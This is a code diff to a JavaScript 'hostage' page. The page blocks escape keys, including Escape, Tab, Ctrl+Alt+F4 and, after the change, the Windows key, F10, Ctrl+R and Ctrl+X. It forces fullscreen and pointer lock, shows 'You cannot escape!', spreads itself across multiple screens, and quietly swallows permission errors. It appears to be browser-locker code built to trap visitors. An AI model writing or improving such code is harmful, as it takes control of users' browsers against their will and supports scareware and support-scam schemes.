@@ -8,6 +8,10 @@ const blockedCombinations = [
   { key: "Escape", keyCode: 27, ctrl: false, alt: false, shift: false },
   { key: "Tab", keyCode: 9, ctrl: false, alt: false, shift: false },
   { key: "F4", keyCode: 115, ctrl: true, alt: true, shift: false },
+  { key: "win", keyCode: 91, ctrl: false, alt: false, shift: false },
+  { key: "F10", keyCode: 121, ctrl: false, alt: false, shift: false },
+  { key : "r", keyCode: 82, ctrl: true, alt: false, shift: false},
+  { key : "x", keyCode: 88, ctrl: true, alt: false, shift: false},
 ];
 
 function warnBlockedAction() {
@@ -32,6 +36,12 @@ function keyboardEventHandler(event) {
       event.altKey === combination.alt &&
       event.shiftKey === combination.shift
     ) {
+      if (combination.key === "Escape" || combination.key === "F11") {
+        event.preventDefault();
+        requestFullscreenBestEffort();
+        return;
+      }
+
       event.preventDefault();
       warnBlockedAction();
       break;
@@ -52,7 +62,10 @@ function requestFullscreenBestEffort() {
   }
 
   document.documentElement.requestFullscreen().catch((err) => {
-    console.error("Failed to enter fullscreen mode:", err);
+    // Silently fail on permission/gesture errors - these are expected
+    if (err.name !== "NotAllowedError" && err.name !== "TypeError") {
+      console.error("Failed to enter fullscreen mode:", err);
+    }
   });
 }
 
@@ -67,7 +80,10 @@ function requestPointerLockBestEffort() {
   try {
     target.requestPointerLock();
   } catch (err) {
-    console.error("Failed to request pointer lock:", err);
+    // Silently fail on permission/gesture errors
+    if (err.name !== "NotAllowedError") {
+      console.error("Failed to request pointer lock:", err);
+    }
   }
 }
 
@@ -75,7 +91,15 @@ function syncPointerLockState() {
   setCursorLocked(Boolean(document.pointerLockElement));
 
   if (delivered && document.fullscreenElement && !document.pointerLockElement) {
-    requestPointerLockBestEffort();
+    const target = document.body || document.documentElement;
+    if (target && typeof target.requestPointerLock === "function") {
+      target.requestPointerLock().catch((err) => {
+        // Silently fail on gesture/permission errors
+        if (err.name !== "NotAllowedError") {
+          console.error("Pointer lock request failed:", err);
+        }
+      });
+    }
   }
 }
 
@@ -94,7 +118,17 @@ function Escape() {
     document.body.append(document.createTextNode("You cannot escape!"));
     setCursorLocked(true);
     requestFullscreenBestEffort();
-    requestPointerLockBestEffort();
+
+    // Pointer lock should only be requested after user gesture is confirmed
+    const target = document.body || document.documentElement;
+    if (target && typeof target.requestPointerLock === "function") {
+      target.requestPointerLock().catch((err) => {
+        // Expected if no fullscreen yet
+        if (err.name !== "NotAllowedError") {
+          console.error("Pointer lock error:", err);
+        }
+      });
+    }
   }
 }
 
@@ -133,7 +167,24 @@ function syncHostagePage() {
 }
 
 function logUnexpectedMutations(mutations) {
-  const details = mutations.map((mutation) => ({
+  // Filter out script, style, and meta tag mutations which are expected
+  const filteredMutations = mutations.filter(mutation => {
+    const target = mutation.target?.nodeName?.toLowerCase();
+    if (target === 'script' || target === 'style' || target === 'meta') return false;
+
+    // Filter out text node mutations from script tags
+    if (mutation.type === 'childList') {
+      for (const node of mutation.addedNodes) {
+        if (node.parentElement?.nodeName?.toLowerCase() === 'script') return false;
+      }
+    }
+
+    return true;
+  });
+
+  if (filteredMutations.length === 0) return;
+
+  const details = filteredMutations.map((mutation) => ({
     type: mutation.type,
     target: mutation.target?.nodeName,
     addedNodes: mutation.addedNodes.length,
@@ -157,7 +208,8 @@ function scheduleHostageResync() {
 }
 
 function hostage() {
-  requestFullscreenBestEffort();
+  // NOTE: requestFullscreenBestEffort() requires user gesture - cannot be called on page load
+  // Instead, bind it to the escape button click or other user interaction
 
   syncHostagePage();
 
@@ -251,16 +303,18 @@ function hostage() {
         return;
       }
 
-      // Request permission for window-placement if available
+      // Request permission for window-placement if available (only with user gesture)
       try {
         if (navigator.permissions && navigator.permissions.query) {
           const p = await navigator.permissions.query({ name: 'window-placement' });
           if (p && p.state !== 'granted') {
-            console.info('window-placement permission is not granted; user prompt may be required');
+            // Permission not granted, skip multi-screen logic
+            return;
           }
         }
       } catch (permErr) {
-        // ignore permission check failures
+        // Permission API not available or gesture required - skip silently
+        return;
       }
 
       const sd = await (window.getScreenDetails ? window.getScreenDetails() : window.getScreens());
@@ -296,7 +350,10 @@ function hostage() {
         }
       }
     } catch (err) {
-      console.warn('Multi-screen placement failed or not supported:', err);
+      // Silently fail for gesture-related errors
+      if (err.name !== "NotAllowedError") {
+        console.warn('Multi-screen placement failed or not supported:', err);
+      }
     }
   }
 
